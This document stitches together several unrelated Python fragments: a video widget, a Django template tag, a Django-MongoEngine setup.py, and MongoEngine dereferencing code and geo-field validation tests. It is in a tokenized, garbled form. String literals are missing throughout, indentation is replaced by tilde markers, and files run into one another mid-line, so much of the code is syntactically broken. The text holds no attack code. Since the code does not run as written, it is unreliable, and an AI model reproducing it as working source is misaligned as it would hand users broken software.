def on_finish ( self , value ) : \n 
~~~ self . _on_finish = WeakMethod ( value ) \n 
\n 
~~ def _draw ( self ) : \n 
~~~ """Draws the video frame""" \n 
\n 
self . _texture . update ( ) \n 
\n 
# Draw the textured quad \n 
Image . _draw ( self ) \n 
\n 
# Check if the video has finished playing through \n 
if self . _texture . video . status == 3 : \n 
~~~ if self . _on_finish and not self . _on_finish_called : \n 
~~~ self . on_finish ( self ) \n 
self . _on_finish_called = Truefrom django import template \n 
~~ ~~ ~~ ~~ from django . conf import settings \n 
\n 
register = template . Library ( ) \n 
\n 
class CheckGrappelli ( template . Node ) : \n 
~~~ def __init__ ( self , var_name ) : \n 
~~~ self . var_name = var_name \n 
~~ def render ( self , context ) : \n 
~~~ context [ self . var_name ] = in settings . INSTALLED_APPS \n 
return \n 
\n 
~~ ~~ def check_grappelli ( parser , token ) : \n 
~~~ """\n    Checks weather grappelli is in installed apps and sets a variable in the context.\n    Unfortunately there is no other way to find out if grappelli is used or not. \n    See: https://github.com/sehmaschine/django-grappelli/issues/32\n    \n    Usage: {% check_grappelli as <varname> %}\n    """ \n 
\n 
bits = token . contents . split ( ) \n 
\n 
if len ( bits ) != 3 : \n 
~~~ raise template . TemplateSyntaxError ( "\'check_grappelli\' tag takes exactly two arguments." ) \n 
\n 
~~ if bits [ 1 ] != : \n 
~~~ raise template . TemplateSyntaxError ( "The second argument to \'check_grappelli\' must be \'as\'" ) \n 
~~ varname = bits [ 2 ] \n 
\n 
return CheckGrappelli ( varname ) \n 
\n 
~~ register . tag ( check_grappelli ) \n 
"""\nDjango-MongoEngine\n------------------\n\nDjango support for MongoDB using MongoEngine.\n\nLinks\n`````\n\n* `development version\n  <https://github.com/MongoEngine/django-mongoengine/raw/master#egg=Django-MongoEngine-dev>`_\n\n""" \n 
from setuptools import setup , find_packages \n 
import sys , os \n 
\n 
\n 
__version__ = \n 
__description__ = , \n 
__license__ = \n 
__author__ = , \n 
__email__ = , \n 
\n 
\n 
sys . path . insert ( 0 , os . path . dirname ( __file__ ) ) \n 
\n 
\n 
REQUIRES = [ i . strip ( ) for i in open ( "requirements.txt" ) . readlines ( ) ] \n 
\n 
\n 
setup ( \n 
name = , \n 
version = __version__ , \n 
url = , \n 
download_url = , \n 
license = __license__ , \n 
author = __author__ , \n 
author_email = __email__ , \n 
description = __description__ , \n 
long_description = __doc__ , \n 
test_suite = , \n 
zip_safe = False , \n 
platforms = , \n 
install_requires = REQUIRES , \n 
packages = find_packages ( exclude = ( , , ) ) , \n 
include_package_data = True , \n 
# use python setup.py nosetests to test \n 
setup_requires = [ , ] , \n 
classifiers = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
) \n 
from mongoengine . base import BaseField \n 
\n 
__all__ = ( ) \n 
\n 
class WtfBaseField ( BaseField ) : \n 
~~~ """\n    Extension wrapper class for mongoengine BaseField.\n\n    This enables flask-mongoengine  wtf to extend the\n    number of field parameters, and settings on behalf\n    of document model form generator for WTForm.\n\n    @param validators:  wtf model form field validators.\n    @param filters:     wtf model form field filters.\n    """ \n 
\n 
def __init__ ( self , validators = None , filters = None , ** kwargs ) : \n 
\n 
~~~ self . validators = self . _ensure_callable_or_list ( validators , ) \n 
self . filters = self . _ensure_callable_or_list ( filters , ) \n 
\n 
BaseField . __init__ ( self , ** kwargs ) \n 
\n 
\n 
~~ def _ensure_callable_or_list ( self , field , msg_flag ) : \n 
~~~ """\n        Ensure the value submitted via field is either\n        a callable object to convert to list or it is\n        in fact a valid list value.\n\n        """ \n 
if field is not None : \n 
~~~ if callable ( field ) : \n 
~~~ field = [ field ] \n 
~~ else : \n 
~~~ msg = "Argument \'%s\' must be a list value" % msg_flag \n 
if not isinstance ( field , list ) : \n 
~~~ raise TypeError ( msg ) \n 
\n 
~~ ~~ ~~ return field \n 
~~ ~~ from bson import DBRef , SON \n 
\n 
from mongoengine . python_support import txt_type \n 
\n 
from base import ( \n 
BaseDict , BaseList , EmbeddedDocumentList , \n 
TopLevelDocumentMetaclass , get_document \n 
) \n 
from fields import ( ReferenceField , ListField , DictField , MapField ) \n 
from connection import get_db \n 
from queryset import QuerySet \n 
from document import Document , EmbeddedDocument \n 
\n 
\n 
class DeReference ( object ) : \n 
~~~ def __call__ ( self , items , max_depth = 1 , instance = None , name = None ) : \n 
~~~ """\n        Cheaply dereferences the items to a set depth.\n        Also handles the conversion of complex data types.\n\n        :param items: The iterable (dict, list, queryset) to be dereferenced.\n        :param max_depth: The maximum depth to recurse to\n        :param instance: The owning instance used for tracking changes by\n            :class:`~mongoengine.base.ComplexBaseField`\n        :param name: The name of the field, used for tracking changes by\n            :class:`~mongoengine.base.ComplexBaseField`\n        :param get: A boolean determining if being called by __get__\n        """ \n 
if items is None or isinstance ( items , basestring ) : \n 
~~~ return items \n 
\n 
# cheapest way to convert a queryset to a list \n 
# list(queryset) uses a count() query to determine length \n 
~~ if isinstance ( items , QuerySet ) : \n 
~~~ items = [ i for i in items ] \n 
\n 
~~ self . max_depth = max_depth \n 
doc_type = None \n 
\n 
if instance and isinstance ( instance , ( Document , EmbeddedDocument , \n 
TopLevelDocumentMetaclass ) ) : \n 
~~~ doc_type = instance . _fields . get ( name ) \n 
while hasattr ( doc_type , ) : \n 
~~~ doc_type = doc_type . field \n 
\n 
~~ if isinstance ( doc_type , ReferenceField ) : \n 
~~~ field = doc_type \n 
doc_type = doc_type . document_type \n 
is_list = not hasattr ( items , ) \n 
\n 
if is_list and all ( [ i . __class__ == doc_type for i in items ] ) : \n 
~~~ return items \n 
~~ elif not is_list and all ( \n 
[ i . __class__ == doc_type for i in items . values ( ) ] ) : \n 
~~~ return items \n 
~~ elif not field . dbref : \n 
~~~ if not hasattr ( items , ) : \n 
\n 
~~~ def _get_items ( items ) : \n 
~~~ new_items = [ ] \n 
for v in items : \n 
~~~ if isinstance ( v , list ) : \n 
~~~ new_items . append ( _get_items ( v ) ) \n 
~~ elif not isinstance ( v , ( DBRef , Document ) ) : \n 
~~~ new_items . append ( field . to_python ( v ) ) \n 
~~ else : \n 
~~~ new_items . append ( v ) \n 
~~ ~~ return new_items \n 
\n 
~~ items = _get_items ( items ) \n 
~~ else : \n 
~~~ items = dict ( [ \n 
( k , field . to_python ( v ) ) \n 
if not isinstance ( v , ( DBRef , Document ) ) else ( k , v ) \n 
for k , v in items . iteritems ( ) ] \n 
) \n 
\n 
~~ ~~ ~~ ~~ self . reference_map = self . _find_references ( items ) \n 
self . object_map = self . _fetch_objects ( doc_type = doc_type ) \n 
return self . _attach_objects ( items , 0 , instance , name ) \n 
\n 
~~ def _find_references ( self , items , depth = 0 ) : \n 
~~~ """\n        Recursively finds all db references to be dereferenced\n\n        :param items: The iterable (dict, list, queryset)\n        :param depth: The current depth of recursion\n        """ \n 
reference_map = { } \n 
if not items or depth >= self . max_depth : \n 
~~~ return reference_map \n 
\n 
# Determine the iterator to use \n 
~~ if not hasattr ( items , ) : \n 
~~~ iterator = enumerate ( items ) \n 
~~ else : \n 
~~~ iterator = items . iteritems ( ) \n 
\n 
# Recursively find dbreferences \n 
~~ depth += 1 \n 
for k , item in iterator : \n 
~~~ if isinstance ( item , ( Document , EmbeddedDocument ) ) : \n 
~~~ for field_name , field in item . _fields . iteritems ( ) : \n 
~~~ v = item . _data . get ( field_name , None ) \n 
if isinstance ( v , DBRef ) : \n 
~~~ reference_map . setdefault ( field . document_type , set ( ) ) . add ( v . id ) \n 
~~ elif isinstance ( v , ( dict , SON ) ) and in v : \n 
~~~ reference_map . setdefault ( get_document ( v [ ] ) , set ( ) ) . add ( v [ ] . id ) \n 
~~ elif isinstance ( v , ( dict , list , tuple ) ) and depth <= self . max_depth : \n 
~~~ field_cls = getattr ( getattr ( field , , None ) , , None ) \n 
references = self . _find_references ( v , depth ) \n 
for key , refs in references . iteritems ( ) : \n 
~~~ if isinstance ( field_cls , ( Document , TopLevelDocumentMetaclass ) ) : \n 
~~~ key = field_cls \n 
~~ reference_map . setdefault ( key , set ( ) ) . update ( refs ) \n 
~~ ~~ ~~ ~~ elif isinstance ( item , DBRef ) : \n 
~~~ reference_map . setdefault ( item . collection , set ( ) ) . add ( item . id ) \n 
~~ elif isinstance ( item , ( dict , SON ) ) and in item : \n 
~~~ reference_map . setdefault ( get_document ( item [ ] ) , set ( ) ) . add ( item [ ] . id ) \n 
~~ elif isinstance ( item , ( dict , list , tuple ) ) and depth - 1 <= self . max_depth : \n 
~~~ references = self . _find_references ( item , depth - 1 ) \n 
for key , refs in references . iteritems ( ) : \n 
~~~ reference_map . setdefault ( key , set ( ) ) . update ( refs ) \n 
\n 
~~ ~~ ~~ return reference_map \n 
\n 
~~ def _fetch_objects ( self , doc_type = None ) : \n 
~~~ """Fetch all references and convert to their document objects\n        """ \n 
object_map = { } \n 
for collection , dbrefs in self . reference_map . iteritems ( ) : \n 
~~~ if hasattr ( collection , ) : # We have a document class for the refs \n 
~~~ col_name = collection . _get_collection_name ( ) \n 
refs = [ dbref for dbref in dbrefs \n 
if ( col_name , dbref ) not in object_map ] \n 
references = collection . objects . in_bulk ( refs ) \n 
for key , doc in references . iteritems ( ) : \n 
~~~ object_map [ ( col_name , key ) ] = doc \n 
~~ ~~ else : # Generic reference: use the refs data to convert to document \n 
~~~ if isinstance ( doc_type , ( ListField , DictField , MapField , ) ) : \n 
~~~ continue \n 
\n 
~~ refs = [ dbref for dbref in dbrefs \n 
if ( collection , dbref ) not in object_map ] \n 
\n 
if doc_type : \n 
~~~ references = doc_type . _get_db ( ) [ collection ] . find ( { : { : refs } } ) \n 
for ref in references : \n 
~~~ doc = doc_type . _from_son ( ref ) \n 
object_map [ ( collection , doc . id ) ] = doc \n 
~~ ~~ else : \n 
~~~ references = get_db ( ) [ collection ] . find ( { : { : refs } } ) \n 
for ref in references : \n 
~~~ if in ref : \n 
~~~ doc = get_document ( ref [ "_cls" ] ) . _from_son ( ref ) \n 
~~ elif doc_type is None : \n 
~~~ doc = get_document ( \n 
. join ( x . capitalize ( ) \n 
for x in collection . split ( ) ) ) . _from_son ( ref ) \n 
~~ else : \n 
~~~ doc = doc_type . _from_son ( ref ) \n 
~~ object_map [ ( collection , doc . id ) ] = doc \n 
~~ ~~ ~~ ~~ return object_map \n 
\n 
~~ def _attach_objects ( self , items , depth = 0 , instance = None , name = None ) : \n 
~~~ """\n        Recursively finds all db references to be dereferenced\n\n        :param items: The iterable (dict, list, queryset)\n        :param depth: The current depth of recursion\n        :param instance: The owning instance used for tracking changes by\n            :class:`~mongoengine.base.ComplexBaseField`\n        :param name: The name of the field, used for tracking changes by\n            :class:`~mongoengine.base.ComplexBaseField`\n        """ \n 
if not items : \n 
~~~ if isinstance ( items , ( BaseDict , BaseList ) ) : \n 
~~~ return items \n 
\n 
~~ if instance : \n 
~~~ if isinstance ( items , dict ) : \n 
~~~ return BaseDict ( items , instance , name ) \n 
~~ else : \n 
~~~ return BaseList ( items , instance , name ) \n 
\n 
~~ ~~ ~~ if isinstance ( items , ( dict , SON ) ) : \n 
~~~ if in items : \n 
~~~ return self . object_map . get ( \n 
( items [ ] . collection , items [ ] . id ) , items ) \n 
~~ elif in items : \n 
~~~ doc = get_document ( items [ ] ) . _from_son ( items ) \n 
_cls = doc . _data . pop ( , None ) \n 
del items [ ] \n 
doc . _data = self . _attach_objects ( doc . _data , depth , doc , None ) \n 
if _cls is not None : \n 
~~~ doc . _data [ ] = _cls \n 
~~ return doc \n 
\n 
~~ ~~ if not hasattr ( items , ) : \n 
~~~ is_list = True \n 
list_type = BaseList \n 
if isinstance ( items , EmbeddedDocumentList ) : \n 
~~~ list_type = EmbeddedDocumentList \n 
~~ as_tuple = isinstance ( items , tuple ) \n 
iterator = enumerate ( items ) \n 
data = [ ] \n 
~~ else : \n 
~~~ is_list = False \n 
iterator = items . iteritems ( ) \n 
data = { } \n 
\n 
~~ depth += 1 \n 
for k , v in iterator : \n 
~~~ if is_list : \n 
~~~ data . append ( v ) \n 
~~ else : \n 
~~~ data [ k ] = v \n 
\n 
~~ if k in self . object_map and not is_list : \n 
~~~ data [ k ] = self . object_map [ k ] \n 
~~ elif isinstance ( v , ( Document , EmbeddedDocument ) ) : \n 
~~~ for field_name , field in v . _fields . iteritems ( ) : \n 
~~~ v = data [ k ] . _data . get ( field_name , None ) \n 
if isinstance ( v , DBRef ) : \n 
~~~ data [ k ] . _data [ field_name ] = self . object_map . get ( \n 
( v . collection , v . id ) , v ) \n 
~~ elif isinstance ( v , ( dict , SON ) ) and in v : \n 
~~~ data [ k ] . _data [ field_name ] = self . object_map . get ( \n 
( v [ ] . collection , v [ ] . id ) , v ) \n 
~~ elif isinstance ( v , ( dict , list , tuple ) ) and depth <= self . max_depth : \n 
~~~ item_name = txt_type ( "{0}.{1}.{2}" ) . format ( name , k , field_name ) \n 
data [ k ] . _data [ field_name ] = self . _attach_objects ( v , depth , instance = instance , name = item_name ) \n 
~~ ~~ ~~ elif isinstance ( v , ( dict , list , tuple ) ) and depth <= self . max_depth : \n 
~~~ item_name = % ( name , k ) if name else name \n 
data [ k ] = self . _attach_objects ( v , depth - 1 , instance = instance , name = item_name ) \n 
~~ elif hasattr ( v , ) : \n 
~~~ data [ k ] = self . object_map . get ( ( v . collection , v . id ) , v ) \n 
\n 
~~ ~~ if instance and name : \n 
~~~ if is_list : \n 
~~~ return tuple ( data ) if as_tuple else list_type ( data , instance , name ) \n 
~~ return BaseDict ( data , instance , name ) \n 
~~ depth += 1 \n 
return data \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ import sys \n 
sys . path [ 0 : 0 ] = [ "" ] \n 
\n 
import unittest \n 
\n 
from mongoengine import * \n 
from mongoengine . connection import get_db \n 
\n 
__all__ = ( "GeoFieldTest" , ) \n 
\n 
\n 
class GeoFieldTest ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ connect ( db = ) \n 
self . db = get_db ( ) \n 
\n 
~~ def _test_for_expected_error ( self , Cls , loc , expected ) : \n 
~~~ try : \n 
~~~ Cls ( loc = loc ) . validate ( ) \n 
self . fail ( . format ( loc ) ) \n 
~~ except ValidationError as e : \n 
~~~ self . assertEqual ( expected , e . to_dict ( ) [ ] ) \n 
\n 
~~ ~~ def test_geopoint_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = GeoPointField ( ) \n 
\n 
~~ invalid_coords = [ { "x" : 1 , "y" : 2 } , 5 , "a" ] \n 
expected = \n 
\n 
for coord in invalid_coords : \n 
~~~ self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ ] , [ 1 ] , [ 1 , 2 , 3 ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Value (%s) must be a two-dimensional point" % repr ( coord ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ { } , { } ] , ( "a" , "b" ) ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Both values (%s) in point must be float or int" % repr ( coord ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ ~~ def test_point_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = PointField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ ] } \n 
expected = \'PointField type must be "Point"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "Point" , "coordinates" : [ 1 , 2 , 3 ] } \n 
expected = "Value ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ 5 , "a" ] \n 
expected = "PointField can only accept lists of [x, y]" \n 
for coord in invalid_coords : \n 
~~~ self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ ] , [ 1 ] , [ 1 , 2 , 3 ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Value (%s) must be a two-dimensional point" % repr ( coord ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ { } , { } ] , ( "a" , "b" ) ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Both values (%s) in point must be float or int" % repr ( coord ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ Location ( loc = [ 1 , 2 ] ) . validate ( ) \n 
Location ( loc = { \n 
"type" : "Point" , \n 
"coordinates" : [ \n 
81.4471435546875 , \n 
23.61432859499169 \n 
] } ) . validate ( ) \n 
\n 
~~ def test_linestring_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = LineStringField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
expected = \'LineStringField type must be "LineString"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "LineString" , "coordinates" : [ [ 1 , 2 , 3 ] ] } \n 
expected = "Invalid LineString:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ 5 , "a" ] \n 
expected = "Invalid LineString must contain at least one valid point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ 1 ] ] \n 
expected = "Invalid LineString:\\nValue (%s) must be a two-dimensional point" % repr ( invalid_coords [ 0 ] ) \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ 1 , 2 , 3 ] ] \n 
expected = "Invalid LineString:\\nValue (%s) must be a two-dimensional point" % repr ( invalid_coords [ 0 ] ) \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ { } , { } ] ] , [ ( "a" , "b" ) ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Invalid LineString:\\nBoth values (%s) in point must be float or int" % repr ( coord [ 0 ] ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ Location ( loc = [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] , [ 1 , 2 ] ] ) . validate ( ) \n 
\n 
~~ def test_polygon_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = PolygonField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
expected = \'PolygonField type must be "Polygon"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "Polygon" , "coordinates" : [ [ [ 1 , 2 , 3 ] ] ] } \n 
expected = "Invalid Polygon:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 5 , "a" ] ] ] \n 
expected = "Invalid Polygon:\\nBoth values ([5, \'a\']) in point must be float or int" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ ] ] ] \n 
expected = "Invalid Polygon must contain at least one valid linestring" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 , 2 , 3 ] ] ] \n 
expected = "Invalid Polygon:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ { } , { } ] ] , [ ( "a" , "b" ) ] ] \n 
expected = "Invalid Polygon:\\nBoth values ([{}, {}]) in point must be float or int, Both values ((\'a\', \'b\')) in point must be float or int" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 , 2 ] , [ 3 , 4 ] ] ] \n 
expected = "Invalid Polygon:\\nLineStrings must start and end at the same point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
Location ( loc = [ [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] , [ 1 , 2 ] ] ] ) . validate ( ) \n 
\n 
~~ def test_multipoint_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = MultiPointField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
expected = \'MultiPointField type must be "MultiPoint"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MultiPoint" , "coordinates" : [ [ 1 , 2 , 3 ] ] } \n 
expected = "Value ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ ] ] \n 
expected = "Invalid MultiPoint must contain at least one valid point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 ] ] , [ [ 1 , 2 , 3 ] ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Value (%s) must be a two-dimensional point" % repr ( coord [ 0 ] ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ [ { } , { } ] ] , [ ( "a" , "b" ) ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Both values (%s) in point must be float or int" % repr ( coord [ 0 ] ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ Location ( loc = [ [ 1 , 2 ] ] ) . validate ( ) \n 
Location ( loc = { \n 
"type" : "MultiPoint" , \n 
"coordinates" : [ \n 
[ 1 , 2 ] , \n 
[ 81.4471435546875 , 23.61432859499169 ] \n 
] } ) . validate ( ) \n 
\n 
~~ def test_multilinestring_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = MultiLineStringField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
expected = \'MultiLineStringField type must be "MultiLineString"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MultiLineString" , "coordinates" : [ [ [ 1 , 2 , 3 ] ] ] } \n 
expected = "Invalid MultiLineString:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ 5 , "a" ] \n 
expected = "Invalid MultiLineString must contain at least one valid linestring" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 ] ] ] \n 
expected = "Invalid MultiLineString:\\nValue (%s) must be a two-dimensional point" % repr ( invalid_coords [ 0 ] [ 0 ] ) \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ 1 , 2 , 3 ] ] ] \n 
expected = "Invalid MultiLineString:\\nValue (%s) must be a two-dimensional point" % repr ( invalid_coords [ 0 ] [ 0 ] ) \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ { } , { } ] ] ] , [ [ ( "a" , "b" ) ] ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Invalid MultiLineString:\\nBoth values (%s) in point must be float or int" % repr ( coord [ 0 ] [ 0 ] ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ Location ( loc = [ [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] , [ 1 , 2 ] ] ] ) . validate ( ) \n 
\n 
~~ def test_multipolygon_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = MultiPolygonField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
expected = \'MultiPolygonField type must be "MultiPolygon"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MultiPolygon" , "coordinates" : [ [ [ [ 1 , 2 , 3 ] ] ] ] } \n 
expected = "Invalid MultiPolygon:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ 5 , "a" ] ] ] ] \n 
expected = "Invalid MultiPolygon:\\nBoth values ([5, \'a\']) in point must be float or int" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ ] ] ] ] \n 
expected = "Invalid MultiPolygon must contain at least one valid Polygon" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ 1 , 2 , 3 ] ] ] ] \n 
expected = "Invalid MultiPolygon:\\nValue ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ { } , { } ] ] ] , [ [ ( "a" , "b" ) ] ] ] \n 
expected = "Invalid MultiPolygon:\\nBoth values ([{}, {}]) in point must be float or int, Both values ((\'a\', \'b\')) in point must be float or int" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ [ [ [ 1 , 2 ] , [ 3 , 4 ] ] ] ] \n 
expected = "Invalid MultiPolygon:\\nLineStrings must start and end at the same point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
Location ( loc = [ [ [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] , [ 1 , 2 ] ] ] ] ) . validate ( ) \n 
\n 
~~ def test_indexes_geopoint ( self ) : \n 
~~~ """Ensure that indexes are created automatically for GeoPointFields.\n        """ \n 
class Event ( Document ) : \n 
~~~ title = StringField ( ) \n 
location = GeoPointField ( ) \n 
\n 
~~ geo_indicies = Event . _geo_indices ( ) \n 
self . assertEqual ( geo_indicies , [ { : [ ( , ) ] } ] ) \n 
\n 
~~ def test_geopoint_embedded_indexes ( self ) : \n 
~~~ """Ensure that indexes are created automatically for GeoPointFields on\n        embedded documents.\n        """ \n 
class Venue ( EmbeddedDocument ) : \n 
~~~ location = GeoPointField ( ) \n 
name = StringField ( ) \n 
\n 
~~ class Event ( Document ) : \n 
~~~ title = StringField ( ) \n 
venue = EmbeddedDocumentField ( Venue ) \n 
\n 
~~ geo_indicies = Event . _geo_indices ( ) \n 
self . assertEqual ( geo_indicies , [ { : [ ( , ) ] } ] ) \n 
\n 
~~ def test_indexes_2dsphere ( self ) : \n 
~~~ """Ensure that indexes are created automatically for GeoPointFields.\n        """ \n 
class Event ( Document ) : \n 
~~~ title = StringField ( ) \n 
point = PointField ( ) \n 
line = LineStringField ( ) \n 
polygon = PolygonField ( ) \n 
\n 
~~ geo_indicies = Event . _geo_indices ( ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
\n 
~~ def test_indexes_2dsphere_embedded ( self ) : \n 
~~~ """Ensure that indexes are created automatically for GeoPointFields.\n        """ \n 
class Venue ( EmbeddedDocument ) : \n 
~~~ name = StringField ( ) \n 
point = PointField ( ) \n 
line = LineStringField ( ) \n 
polygon = PolygonField ( ) \n 
\n 
~~ class Event ( Document ) : \n 
~~~ title = StringField ( ) \n 
venue = EmbeddedDocumentField ( Venue ) \n 
\n 
~~ geo_indicies = Event . _geo_indices ( ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
self . assertTrue ( { : [ ( , ) ] } in geo_indicies ) \n 
\n 
~~ def test_geo_indexes_recursion ( self ) : \n 
\n 
~~~ class Location ( Document ) : \n 
~~~ name = StringField ( ) \n 
location = GeoPointField ( ) \n 
\n 
~~ class Parent ( Document ) : \n 
~~~ name = StringField ( ) \n 
location = ReferenceField ( Location ) \n 
\n 
~~ Location . drop_collection ( ) \n 
Parent . drop_collection ( ) \n 
\n 
Parent ( name = ) . save ( ) \n 
info = Parent . _get_collection ( ) . index_information ( ) \n 
self . assertFalse ( in info ) \n 
info = Location . _get_collection ( ) . index_information ( ) \n 
self . assertTrue ( in info ) \n 
\n 
self . assertEqual ( len ( Parent . _geo_indices ( ) ) , 0 ) \n 
self . assertEqual ( len ( Location . _geo_indices ( ) ) , 1 ) \n 
\n 
~~ def test_geo_indexes_auto_index ( self ) : \n 
\n 
# Test just listing the fields \n 
~~~ class Log ( Document ) : \n 
~~~ location = PointField ( auto_index = False ) \n 
datetime = DateTimeField ( ) \n 
\n 
meta = { \n 
: [ [ ( "location" , "2dsphere" ) , ( "datetime" , 1 ) ] ] \n 
} \n 
\n 
~~ self . assertEqual ( [ ] , Log . _geo_indices ( ) ) \n 
\n 
Log . drop_collection ( ) \n 
Log . ensure_indexes ( ) \n 
\n 
info = Log . _get_collection ( ) . index_information ( ) \n 
self . assertEqual ( info [ "location_2dsphere_datetime_1" ] [ "key" ] , \n 
